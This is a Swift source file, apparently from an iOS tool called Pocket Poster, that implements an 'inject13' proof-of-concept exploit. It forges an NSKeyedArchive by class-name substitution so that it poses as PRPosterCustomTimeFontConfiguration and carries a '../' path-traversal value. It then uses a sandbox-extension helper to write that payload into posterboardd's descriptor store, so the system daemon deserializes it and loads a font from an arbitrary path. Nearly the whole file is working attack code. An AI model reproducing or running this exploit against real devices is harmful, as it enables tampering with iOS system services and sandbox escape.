//
//  Inject13.swift
//  Pocket Poster
//
//  inject13 proof-of-concept: writes a PRPosterCustomTimeFontConfiguration
//  NSKeyedArchive into posterboardd's descriptor store. On a ClockPoster
//  lock screen type, posterboardd deserializes the archive and calls
//  CGFontCreateFontsWithURL on the extensionBundleRelativeFilePath value.
//
//  Base URL = /System/Applications/MobileTimer.app/PlugIns/ClockFace.appex/
//  4× "../" reaches /System/, so "../../../../Library/Fonts/X" → /System/Library/Fonts/X
//

import Foundation

// MARK: - Archive proxy

/// Encodes as PRPosterCustomTimeFontConfiguration via NSKeyedArchiver class-name substitution.
@objc(Inject13Proxy)
private final class Inject13Proxy: NSObject, NSCoding {
    var fontPostScriptName: String
    var extensionBundleRelativeFilePath: String

    init(psName: String, traversalPath: String) {
        self.fontPostScriptName = psName
        self.extensionBundleRelativeFilePath = traversalPath
    }

    required init?(coder: NSCoder) {
        fontPostScriptName = coder.decodeObject(forKey: "fontPostScriptName") as? String ?? ""
        extensionBundleRelativeFilePath = coder.decodeObject(forKey: "extensionBundleRelativeFilePath") as? String ?? ""
    }

    func encode(with coder: NSCoder) {
        coder.encode(fontPostScriptName, forKey: "fontPostScriptName")
        coder.encode(extensionBundleRelativeFilePath, forKey: "extensionBundleRelativeFilePath")
    }
}

// MARK: - Public API

enum Inject13Error: LocalizedError {
    case noExtensions
    case noWritesSucceeded

    var errorDescription: String? {
        switch self {
        case .noExtensions:     return "No extension directories found in PRBPosterExtensionDataStore."
        case .noWritesSucceeded: return "Payload was not written to any descriptor directory."
        }
    }
}

struct Inject13 {

    /// Traversal path for the initial font-load test (points at a real font so
    /// the clock face changes visibly if the traversal fires).
    /// 4× "../" from ClockFace.appex → /System/; then into Fonts/.
    static let testTraversalPath = "../../../../Library/Fonts/MarkerFelt.ttc"
    static let testPSName        = "MarkerFelt-Thin"

    // MARK: Payload

    /// Returns a binary-plist NSKeyedArchive whose root object claims to be
    /// PRPosterCustomTimeFontConfiguration with the two keys posterboardd decodes.
    static func buildPayload(psName: String = testPSName,
                             traversalPath: String = testTraversalPath) throws -> Data {
        // Tell the archiver to write "PRPosterCustomTimeFontConfiguration" as the
        // $classname instead of "Inject13Proxy". posterboardd's NSSecureCoding will
        // look up the real class by that string and call initWithCoder: on it.
        NSKeyedArchiver.setClassName("PRPosterCustomTimeFontConfiguration",
                                     for: Inject13Proxy.self)

        let proxy = Inject13Proxy(psName: psName, traversalPath: traversalPath)
        let data = try NSKeyedArchiver.archivedData(withRootObject: proxy,
                                                    requiringSecureCoding: false)
        return data
    }

    // MARK: Inject

    /// Writes the payload to every descriptor directory found under posterboardd's
    /// PRBPosterExtensionDataStore. Returns the list of paths that were written.
    ///
    /// NOTE: switch the lock screen to a ClockPoster type (Digital, Analog, Rolling,
    /// World, or Astronomy) BEFORE calling this, then lock/unlock to trigger posterboardd
    /// to deserialize the descriptor.
    @discardableResult
    static func inject(appHash: String,
                       psName: String = testPSName,
                       traversalPath: String = testTraversalPath) throws -> [String] {
        let payload = try buildPayload(psName: psName, traversalPath: traversalPath)

        let ver = SymHandler.getExtensionVersion()
        let containerBase = "/var/mobile/Containers/Data/Application/\(appHash)"
        let extensionsRoot = "\(containerBase)/Library/Application Support/PRBPosterExtensionDataStore/\(ver)/Extensions"

        // Sandbox extension on the extensions root
        let rootHandle = try BadQuery.consume(path: extensionsRoot, create: true)
        defer { rootHandle.release() }

        let fm = FileManager.default
        guard fm.fileExists(atPath: extensionsRoot) else {
            throw Inject13Error.noExtensions
        }

        let extDirs = (try? fm.contentsOfDirectory(atPath: extensionsRoot)) ?? []
        guard !extDirs.isEmpty else {
            throw Inject13Error.noExtensions
        }

        var written: [String] = []

        for extName in extDirs {
            let descriptorsPath = "\(extensionsRoot)/\(extName)/descriptors"

            let descHandle = try? BadQuery.consume(path: descriptorsPath, create: true)
            defer { descHandle?.release() }

            try? fm.createDirectory(atPath: descriptorsPath,
                                    withIntermediateDirectories: true)

            let destPath = "\(descriptorsPath)/inject13_font.keyed"
            do {
                try payload.write(to: URL(fileURLWithPath: destPath))
                written.append(destPath)
                print("Inject13: wrote payload → \(destPath)")
            } catch {
                print("Inject13: skipped \(destPath): \(error)")
            }
        }

        if written.isEmpty { throw Inject13Error.noWritesSucceeded }
        return written
    }
}
